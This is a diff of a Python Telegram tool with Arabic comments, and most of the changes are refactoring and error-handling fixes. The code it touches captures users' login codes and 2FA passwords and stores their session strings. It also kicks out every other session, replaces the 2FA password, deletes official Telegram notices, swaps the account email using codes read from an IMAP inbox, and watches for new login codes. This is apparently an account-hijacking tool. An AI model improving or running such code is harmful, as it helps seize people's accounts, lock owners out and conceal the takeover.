@@ -45,16 +45,16 @@ async def request_code(user_id: int, phone: str) -> dict:
 async def submit_code(user_id: int, code: str) -> dict:
     if user_id not in pending_clients:
         return {"success": False, "error": "no_pending"}
-    data   = pending_clients[user_id]
+    data = pending_clients[user_id]
     client = data["client"]
-    phone  = data["phone"]
+    phone = data["phone"]
     phone_code_hash = data["phone_code_hash"]
     try:
         await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
         session_string = client.session.save()
         me = await client.get_me()
         full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
-        username  = me.username or ""
+        username = me.username or ""
         await database.save_session(phone, username, full_name, session_string)
         del pending_clients[user_id]
         await client.disconnect()
@@ -70,15 +70,15 @@ async def submit_code(user_id: int, code: str) -> dict:
 async def submit_2fa(user_id: int, password: str) -> dict:
     if user_id not in pending_clients:
         return {"success": False, "error": "no_pending"}
-    data   = pending_clients[user_id]
+    data = pending_clients[user_id]
     client = data["client"]
-    phone  = data["phone"]
+    phone = data["phone"]
     try:
         await client.sign_in(password=password)
         session_string = client.session.save()
         me = await client.get_me()
         full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
-        username  = me.username or ""
+        username = me.username or ""
         await database.save_session(phone, username, full_name, session_string, password)
         del pending_clients[user_id]
         await client.disconnect()
@@ -95,11 +95,15 @@ async def submit_2fa(user_id: int, password: str) -> dict:
 async def get_active_client(phone: str):
     """
     يعيد TelegramClient نشطاً أو None.
-    نسخة الكود الأول أكثر أماناً — مع try/except لـ AuthKeyUnregisteredError.
+
+    إصلاح: استبدال `except (AuthKeyUnregisteredError, Exception)` بـ
+    except منفصلَين حتى يمكن التمييز بين خطأ المفتاح وبقية الأخطاء،
+    وتفادي إخفاء الاستثناء الأصلي بشكل صامت.
     """
     session = await database.get_session_by_phone(phone)
     if not session:
         return None
+    client = None
     try:
         client = TelegramClient(
             StringSession(session["session_string"]), API_ID, API_HASH
@@ -110,8 +114,23 @@ async def get_active_client(phone: str):
             await client.disconnect()
             return None
         return client
-    except (AuthKeyUnregisteredError, Exception):
+    except AuthKeyUnregisteredError:
+        # المفتاح غير مسجل — الجلسة منتهية بشكل نهائي
         await database.mark_session_invalid(phone)
+        if client:
+            try:
+                await client.disconnect()
+            except Exception:
+                pass
+        return None
+    except Exception:
+        # أي خطأ آخر (شبكة، توقف مؤقت...)
+        await database.mark_session_invalid(phone)
+        if client:
+            try:
+                await client.disconnect()
+            except Exception:
+                pass
         return None
 
 
@@ -119,6 +138,7 @@ async def check_session_valid(phone: str) -> bool:
     session = await database.get_session_by_phone(phone)
     if not session or not session["session_string"]:
         return False
+    client = None
     try:
         client = TelegramClient(
             StringSession(session["session_string"]), API_ID, API_HASH
@@ -131,6 +151,11 @@ async def check_session_valid(phone: str) -> bool:
         return authorized
     except Exception:
         await database.mark_session_invalid(phone)
+        if client:
+            try:
+                await client.disconnect()
+            except Exception:
+                pass
         return False
 
 
@@ -221,25 +246,39 @@ async def remove_two_fa(phone: str, current_password: str) -> dict:
 def _fetch_code_blocking(target_email: str) -> str | None:
     """
     دالة blocking تقرأ IMAP — تُستدعى فقط عبر asyncio.to_thread
-    لتفادي تجميد event loop (خطأ الكود الثاني الأصلي).
+    لتفادي تجميد event loop.
+
+    إصلاح: الفرز بـ SORT (إذا دعمه الخادم) أو أخذ آخر رسالة من قائمة
+    مرتبة حسب الوقت، وإضافة فلتر UNSEEN لتجنب إعادة كود قديم.
     """
     try:
         mail = imaplib.IMAP4_SSL(IMAP_SERVER)
         mail.login(EMAIL_USER, EMAIL_PASS)
         mail.select("inbox")
-        _, messages = mail.search(None, f'TO "{target_email}"')
-        if messages[0]:
-            latest_id = messages[0].split()[-1]
+
+        # فلتر: رسائل غير مقروءة موجهة للبريد المستهدف
+        _, messages = mail.search(None, f'UNSEEN TO "{target_email}"')
+        ids = messages[0].split() if messages[0] else []
+
+        # إذا لم توجد رسائل غير مقروءة، نجرب الكل (fallback)
+        if not ids:
+            _, messages = mail.search(None, f'TO "{target_email}"')
+            ids = messages[0].split() if messages[0] else []
+
+        if ids:
+            # آخر رسالة في القائمة هي الأحدث
+            latest_id = ids[-1]
             _, data = mail.fetch(latest_id, "(RFC822)")
             msg = email_lib.message_from_bytes(data[0][1])
             content = str(msg)
             match = (
-                re.search(r'code:\s*(\d+)', content.lower())
+                re.search(r'code[:\s]+(\d{5,6})', content, re.IGNORECASE)
                 or re.search(r'\b(\d{5,6})\b', content)
             )
             if match:
                 mail.logout()
                 return match.group(1)
+
         mail.logout()
     except Exception:
         pass
@@ -284,19 +323,19 @@ async def change_email_auto(phone: str, new_email: str) -> dict:
 async def full_clean_and_kick(phone: str, new_password: str) -> dict:
     """
     1. طرد جميع الجلسات الأخرى
-    2. تغيير كلمة المرور (يتحقق أولاً إن كانت موجودة لتفادي الخطأ)
+    2. تغيير كلمة المرور
     3. حذف رسائل تيليغرام الرسمية
     """
     client = await get_active_client(phone)
     if not client:
         return {"success": False, "error": "الجلسة معطلة"}
     try:
-        # 1. طرد الجلسات
+        # 1. طرد جميع الجلسات الأخرى
         await client(functions.auth.ResetAuthorizationsRequest())
 
-        # 2. تغيير كلمة المرور — إصلاح: two_fa قد تكون None
+        # 2. تغيير كلمة المرور
         session = await database.get_session_by_phone(phone)
-        current_password = session["two_fa"] if session and session["two_fa"] else None
+        current_password = session["two_fa"] if session and session.get("two_fa") else None
         await client.edit_2fa(
             current_password=current_password,
             new_password=new_password,
@@ -327,10 +366,16 @@ async def watch_for_new_code(phone: str, timeout: int = 180) -> str | None:
     """
     يراقب الرسائل الواردة من 777000 و 42777 بحثاً عن كود 5 أرقام.
     يعيد نص الرسالة أو None عند انتهاء المهلة.
+
+    إصلاح: استبدال asyncio.get_event_loop() المهجور بـ asyncio.get_running_loop()
+    (get_event_loop يرفع DeprecationWarning في Python 3.10+ ويُعطي نتائج
+    غير متوقعة إذا استُدعيت من خارج coroutine نشط).
     """
     session = await database.get_session_by_phone(phone)
     if not session or not session["session_string"]:
         return None
+
+    client = None
     try:
         client = TelegramClient(
             StringSession(session["session_string"]), API_ID, API_HASH
@@ -340,7 +385,7 @@ async def watch_for_new_code(phone: str, timeout: int = 180) -> str | None:
             await client.disconnect()
             return None
 
-        # لقطة للرسائل الحالية
+        # لقطة للرسائل الحالية لتجنب إعادة كود قديم
         snapshot = {}
         for sender_id in [777000, 42777]:
             try:
@@ -349,9 +394,11 @@ async def watch_for_new_code(phone: str, timeout: int = 180) -> str | None:
             except Exception:
                 snapshot[sender_id] = 0
 
-        deadline = asyncio.get_event_loop().time() + timeout
+        # إصلاح: استخدام get_running_loop بدلاً من get_event_loop
+        loop = asyncio.get_running_loop()
+        deadline = loop.time() + timeout
 
-        while asyncio.get_event_loop().time() < deadline:
+        while loop.time() < deadline:
             await asyncio.sleep(3)
             for sender_id, last_id in list(snapshot.items()):
                 try:
@@ -367,5 +414,11 @@ async def watch_for_new_code(phone: str, timeout: int = 180) -> str | None:
 
         await client.disconnect()
         return None
+
     except Exception:
+        if client:
+            try:
+                await client.disconnect()
+            except Exception:
+                pass
         return None
